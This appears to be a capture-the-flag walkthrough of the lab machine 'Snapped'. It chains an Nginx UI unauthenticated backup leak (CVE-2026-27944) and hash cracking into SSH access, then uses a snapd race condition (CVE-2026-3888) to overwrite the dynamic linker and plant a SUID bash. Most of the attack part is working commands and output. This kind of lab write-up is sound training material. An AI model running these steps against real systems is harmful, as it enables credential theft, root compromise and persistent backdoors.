# Snapped Walkthorugh

![alt text](images/pwned.png)

# Reconnaisance 

First we perform a nmap scan to identify the services running on the target machine.

```bash
nmap -sC -sV -A <TARGET_IP> -oA output_file

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 03:36 EDT
Nmap scan report for 10.129.13.38
Host is up (0.68s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  tcpwrapped
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   385.48 ms 10.10.14.1
2   385.43 ms 10.129.13.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.68 seconds
```
We found two services from our scan.

Let's check the website on port 80.

![alt text](images/website.png)

We cannot find a potential vector on this webpage.

Let's move for Vhost and directory fuzzing 

## Vhost Fuzzing

```
ffuf -u http://snapped.htb -H "HOST: FUZZ.snapped.htb" -w /usr/share/seclists/Discovery/DNS/listname -ac

 /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 1148ms]
```
Perfect!! We found Vhost. Let's add this to our hosts file.

Now let's check the webiste at admin endpoint.
We have a login page here.
I tried default credentials nothing worked and I got nothing from further scans.

So, let's see if we can find any endpoints from our requests we till made.
Bingo!! We found /api/install endpoint from when we visited the page with a status code 200

![alt text](images/Ngnix-UI.png)

Let's fuzz the api endpoint.

```bash
feroxbuster -u http://admin.snapped.htb/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 500,403,403 -t 30 -d 3  
                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.snapped.htb/api
 🚩  In-Scope Url          │ admin.snapped.htb
 🚀  Threads               │ 30
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [500, 403, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 3
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                   
200      GET        1l        1w       29c http://admin.snapped.htb/api/install
200      GET       81l      440w    33079c http://admin.snapped.htb/api/backup
200      GET        1l        9w    52782c http://admin.snapped.htb/api/licenses
[#>------------------] - 3m     15697/220548  34m     found:3       errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_admin_snapped_htb_api-1774357766.state ...
[#>------------------] - 3m     15705/220548  34m     found:3       errors:0      
[#>------------------] - 3m     15695/220546  97/s    http://admin.snapped.htb/api/ 
```
We found three directories.

Now let's try to access them.

```bash
curl -v http://admin.snapped.htb/api/backup                 
* Host admin.snapped.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.13.38
*   Trying 10.129.13.38:80...
* Established connection to admin.snapped.htb (10.129.13.38 port 80) from 10.10.14.241 port 35066 
* using HTTP/1.x
> GET /api/backup HTTP/1.1
> Host: admin.snapped.htb
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Tue, 24 Mar 2026 13:11:18 GMT
< Content-Type: application/zip
< Content-Length: 18354
< Connection: keep-alive
< Accept-Ranges: bytes
< Cache-Control: must-revalidate
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=backup-20260324-091118.zip
< Content-Transfer-Encoding: binary
< Expires: 0
< Last-Modified: Tue, 24 Mar 2026 13:11:18 GMT
< Pragma: public
< Request-Id: af168dd8-2efa-4184-a76d-ea7162dfc1da
< X-Backup-Security: MgzdI0XJazQ2pR+7FC1BHFZQWxltjcKkp2AqhZcV2QI=:qeClzKyylJyq73sCCc5DJQ==
< 
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or 
Warning: consider "--output <FILE>" to save to a file.
* client returned ERROR on write of 6176 bytes
* closing connection #0
```

Now we can see some weird header here.
So i searched for X-Backup-Security header and found this CVE --> CVE-2026-27944

```text
In vulnerable versions of Nginx UI, the /api/backup endpoint could be accessed without authentication.
When triggered, the server would return:

A backup file (often a ZIP archive of the system configuration or data).
An HTTP response header named X-Backup-Security.
This header contained sensitive cryptographic material:

AES-256 encryption key (Base64 encoded)
Initialization Vector (IV) (Base64 encoded)
These values were meant to encrypt/decrypt the backup file, but because they were sent to unauthenticated users, anyone could decrypt the backup.
```
Now we can use the base64 text from the header to access the contents of file
But I found a Github PoC for that. Here is the link -> https://github.com/Skynoxk/CVE-2026-27944

Now clone it and use the script aganist the website.

```bash
python exploit_enhanced.py --target http://admin.snapped.htb --decrypt --create-user hacker --password Pwned@123!
```

We have database at nginx-ui directory.

```bash
file database.db 
database.db: SQLite 3.x database, last written using SQLite version 3050004, file counter 84, database pages 64, cookie 0x39, schema 4, UTF-8, version-valid-for 84
```

Let's access the db

```bash
(venv)─(kali㉿kali)-[~/…/snapped/CVE-2026-27944/backup_extracted/nginx-ui]
└─$ sqlite3 database.db     
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> select * from users;
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn.................VltEvm|1||g�

|�7�ĝ�*�:���(��\�D�O�}u#,�|en
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSp..........soGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��▒KĦ"D���W▒|en
sqlite> 
```

We found two hashes.Save them in a file, We can see that they are bcrypt hashes with 10 rounds.
We can use hashcat to decrypt them.

```bash
hashcat -m 3200 hash.txt rockyou.txt
```
It successuly cracked a hash.

## User flag

Let's login as jonathan via ssh

```bash
ssh jonathan@snapped.htb
The authenticity of host 'snapped.htb (10.129.13.38)' can't be established.
ED25519 key fingerprint is: SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'snapped.htb' (ED25519) to the list of known hosts.
jonathan@snapped.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

jonathan@snapped:~$ ls -l
total 40
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Desktop
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Documents
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Downloads
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Music
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Pictures
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Public
drwx------ 3 jonathan jonathan 4096 Mar 20 11:38 snap
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Templates
-rw-r----- 1 root     jonathan   33 Mar 24 03:28 user.txt
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 Videos
```
Hurray!! We found our user flag.

## Privilege Escalation

Found a vulnerable snapd 
It is vulnerable to cve-2026-3888
Let's check if we can solve this using it.

### Explanation

```text
The target is vulnerable to a snapd race condition (CVE-2026-3888).

snap-confine runs as SUID root
It creates a temporary sandbox in /tmp/.snap/
It:
Creates files/directories
Deletes them periodically (every ~4 minutes via systemd tmpfiles)
Mounts a filesystem inside the sandbox

This creates a race condition window where:

We can replace files before snap-confine uses them
Leading to arbitrary file overwrite as root
```

```
jonathan@snapped:/tmp$ cat /etc/os-release 
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
jonathan@snapped:/tmp$ cat /usr/lib/tmpfiles.d/tmp.conf 
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.

# See tmpfiles.d(5) for details

# Clear tmp directories separately, to make them easier to override
D /tmp 1777 root root 4m
#q /var/tmp 1777 root root 30d
jonathan@snapped:/tmp$ 
```

Look at the output for every 4 minutes files from /tmp directory are being deleted.

## Exploitation

Before starting exploitation let's compile required libraries
Download these scripts and compile them :
1. [text](firefox_2404.c)
2. [text](librootshell.c)

We are preparing a payload that root will unknowingly execute

```bash
gcc -O2 -static -o firefox_2404 firefox_2404.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
```
### Explanation

```bash
firefox_2404 → race-condition exploit binary
Detects the right timing
Swaps directories during snap execution
librootshell.so → malicious shared library
Will replace the system dynamic linker
Executes code as root when loaded
```

Let's upload them to jonathan

```bash
 scp firefox_2404 librootshell.so jonathan@snapped.htb:~/
```

### Terminal 01

Start a sandbox, keep this terminal open

```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
```
Flags:
env -i → clean environment (important for snap behavior)
snap-confine → SUID root binary
Creates sandbox inside /tmp/.snap
This is the target process we race against

This will start sandbox. Now let's check our PID. It is needed to track sandbox via /proc/<PID>

```bash
cd /tmp
echo $$
```
Save this PID 

now wait for .snap deletion

```bash
while test -d ./.snap; do touch ./; sleep 1; done
```
This keeps /tmp active but allows .snap to be deleted. This creates race window.

### Terminal 02

Access sandbox

```bash
cd /proc/<PID>/cwd
```
 - /proc/<PID>/cwd → current working directory of process
 - Lets us access sandbox directory even if restricted

Now let's break the cached namespaces

```bash
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
```

This creates a new systemd scope and helps escape namespace restrictions

```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
```
This instruction is supposed to fail.

### Explanation

```text
Intentionally fails execution
Leaves behind inconsistent mount state
 This weakens sandbox isolation
```

### Trigger Race Condition

```bash
~/firefox_2404 ~/librootshell.so
```
- Monitors .snap deletion
- Quickly swaps directories
- Injects malicious payload

We must see "trigger detected" and "swap done " in our output.
If not start again from Terminal 01

### Terminal 03

Let's check if the PID is still active.

```bash
cat /proc/18606/cwd/race_pid.txt
```
This should return a value
Exploit writesnew privileged PID and confirms race success.

Let's move into poisoned root file system

```bash
PID=$(cat /proc/<PID>/cwd/race_pid.txt)
cd /proc/$PID/root
```
/proc/<PID>/root → root filesystem of process
Gives us access to filesystem as seen by root process

### Payload injection

```bash
cp /usr/bin/busybox ./tmp/sh
```
This places a usable shell inside sandbox and it is needed because environment is minimal.

```bash
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```
This is critical.
This overwrites dynamic linker and will be used by dynamically linked binary.
Every dynamically linked library -> /bin/something → uses ld-linux.so BEFORE execution
since snap-confine is a SUID:
 - it loads our linker and runs code as root.

### Trigger Root Execution

```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine

# output
/ # id
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)

```

Executes snap-confine again.
since it is SUID -> runs as root -> loads our malicious.so

### Escape sandbox

```bash
cp /bin/bash /var/snap/firefox/common/bash
chmod 4755 /var/snap/firefox/common/bash
exit
```
copies bash outside sandbox and sets SUID bit.

### Persistent root

```bash
/var/snap/firefox/common/bash -p
jonathan@snapped:/proc/3931/root$ /var/snap/firefox/common/bash -p
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1# cd /root
bash-5.1# cat /root/root.txt
f034...............9e6d
```

## Attack Chain Summary

```text
Initial Access
│
├─ CVE-2026-27944 (Nginx UI Backup Leak)
│   └─ Decrypt Backup → Extract DB
│       └─ Crack Hash → SSH (jonathan)
│
Privilege Escalation
│
├─ CVE-2026-3888 (snapd race condition)
│   ├─ SUID snap-confine
│   ├─ /tmp cleanup race
│   ├─ Namespace escape via /proc
│   ├─ Race condition exploit
│   ├─ Dynamic linker overwrite
│   └─ Root code execution
│
└─ Persistence
    └─ SUID bash → root anytime
```

## Key Vulnerabilities

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | Exposed Nginx UI API endpoint (`/api/backup`) | Allowed unauthenticated users to download sensitive backup files |
| 2 | CVE-2026-27944 (Nginx UI Backup Disclosure) | Leaked AES key and IV via `X-Backup-Security` header enabling backup decryption |
| 3 | Sensitive data exposure in backup | Revealed SQLite database containing user credentials |
| 4 | Weak password hashing (bcrypt, crackable) | Enabled offline password cracking using wordlists |
| 5 | Credential reuse (SSH access) | Allowed login as `jonathan` via SSH |
| 6 | SUID root binary (`snap-confine`) | Provided attack surface for privilege escalation |
| 7 | CVE-2026-3888 (snapd race condition) | Enabled arbitrary file overwrite as root via race condition |
| 8 | Insecure `/tmp` cleanup mechanism | Created predictable race window for exploitation |
| 9 | Namespace escape via `/proc` filesystem | Allowed access to restricted sandbox directories |
|10 | Dynamic linker overwrite (`ld-linux`) | Achieved execution of attacker-controlled code as root |
|11 | Lack of sandbox isolation hardening | Allowed persistence of malicious modifications |
|12 | SUID bash persistence | Provided stable and reusable root shell |